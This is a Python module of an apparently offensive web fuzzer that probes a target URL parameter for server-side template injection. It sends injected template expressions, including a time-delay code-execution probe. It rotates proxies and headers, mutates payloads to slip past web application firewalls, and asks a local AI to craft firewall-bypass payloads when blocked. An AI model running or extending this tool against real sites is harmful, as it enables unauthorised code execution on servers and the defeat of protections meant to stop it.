# modules/ssti.py
import os
import time
import logging
import asyncio
import aiohttp
from typing import List, Dict, Any, Tuple
from modules.base import BaseModule
import config

logger = logging.getLogger("water_fuzzer.ssti")

class SSTIModule(BaseModule):
    """Modul SSTI V10.1 Asinkronus (AI-Driven Evidence Framework)."""

    def load_payloads(self) -> List[str]:
        payload_file = os.path.join(config.BASE_DIR, "payloads", "ssti.txt")
        if os.path.exists(payload_file):
            try:
                with open(payload_file, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip() and not line.startswith("#")]
            except IOError as e:
                logger.error(f"Gagal membaca payloads SSTI: {str(e)}")
        return ["{{7*7}}", "{{import('time').sleep(5)}}"]

    async def execute_and_evaluate(self, session: aiohttp.ClientSession, payload: str, base_payload: str, headers: dict) -> Tuple[bool, bool]:
        try:
            start_time = time.time()
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload}, headers=headers, timeout=self.auditor.timeout, proxy=self.auditor._get_random_proxy()) as res:
                    body = await res.text(); status = res.status
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload}, headers=headers, timeout=self.auditor.timeout, proxy=self.auditor._get_random_proxy()) as res:
                    body = await res.text(); status = res.status
            
            latency = time.time() - start_time
            if status in [403, 409, 429] or "waf" in body.lower() or "blocked" in body.lower():
                return False, True

            indicators = []
            current_entropy = self.auditor.calculate_content_entropy(body)
            entropy_delta = abs(current_entropy - self.auditor.baseline["entropy_score"])
            
            module_specific = {"vulnerability_proof_concept": "Template Engine Expression Evaluation", "injected_template_syntax": base_payload, "is_mathematical_computed": False, "runtime_engine_fingerprint": "Unknown Engine"}

            if "sleep" in base_payload and latency >= (self.auditor.baseline["response_time"] + config.TIME_DELAY_THRESHOLD):
                indicators.extend(["time_anomaly", "consistent_evaluation_proof"])
                module_specific["vulnerability_proof_concept"] = "Blind Time-Based Template Execution"

            if "49" in body and base_payload not in body:
                indicators.append("anomalous_output")
                if " 49 " in f" {body} " or ">49<" in body:
                    indicators.append("consistent_evaluation_proof")
                    module_specific["is_mathematical_computed"] = True
                    module_specific["runtime_engine_fingerprint"] = "Jinja2 / Twig Compatible"

            if status != self.auditor.baseline["status_code"] or len(body) != self.auditor.baseline["content_length"]:
                indicators.append("response_diff")
            if entropy_delta > 0.5: indicators.append("entropy_deviation")

            if indicators:
                self.auditor.evaluate_heuristic_evidence(body, status, latency, payload, indicators, "SSTI", module_specific)
                return True, False
        except asyncio.TimeoutError:
            if "sleep" in base_payload:
                self.auditor.evaluate_heuristic_evidence("NETWORK_TIMEOUT_TRIGGERED", 504, self.auditor.timeout, payload, ["time_anomaly", "consistent_evaluation_proof"], "SSTI", {"vulnerability_proof_concept": "Blind Template Execution (Timeout Verified)"})
                return True, False
        except Exception: pass
        return False, False

    async def run_audit(self, session: aiohttp.ClientSession) -> bool:
        print("[*] Menjalankan Modul V10.1: Server-Side Template Injection (AI-Driven)...")
        headers = self.auditor._get_random_headers()
        payloads = self.load_payloads()
        found_any_vuln = False

        for base_payload in payloads:
            for strategy in range(4):
                payload = self.auditor.mutate_payload_for_waf(base_payload, strategy)
                success, trigger_ai = await self.execute_and_evaluate(session, payload, base_payload, headers)
                if success: found_any_vuln = True; break
                if trigger_ai:
                    print(f"[\033[1;31m!\033[0m] Proteksi WAF Terdeteksi! Memicu Pipa Pemikiran AI Lokal...")
                    ai_payload = await self.auditor.ask_local_ai_to_bypass_waf(session, base_payload, "WAF_BLOCK_DETECTED")
                    if ai_payload:
                        success_ai, _ = await self.execute_and_evaluate(session, ai_payload, base_payload, headers)
                        if success_ai: found_any_vuln = True; break
            if found_any_vuln: break
        return found_any_vuln
